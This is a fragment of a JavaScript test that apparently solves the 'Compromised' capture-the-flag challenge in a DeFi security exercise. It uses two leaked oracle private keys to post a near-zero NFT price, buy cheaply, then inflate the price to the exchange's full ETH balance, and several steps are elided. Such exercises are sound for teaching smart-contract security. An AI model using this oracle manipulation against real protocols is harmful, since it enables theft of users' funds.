...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const s1 = new ethers.Wallet(pk1, ethers.provider);
    const s2 = new ethers.Wallet(pk2, ethers.provider);

    console.log(s1.address);
    console.log(s2.address);

    await oracle.connect(s1).postPrice("DVNFT", 1);
    await oracle.connect(s2).postPrice("DVNFT", 1);

    await exchange.connect(player).buyOne({ value: 1 });

    await oracle
      .connect(s1)
      .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1n);
    await oracle
      .connect(s2)
      .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1n);
    ...
    await oracle.connect(s1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
    await oracle.connect(s2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
  });
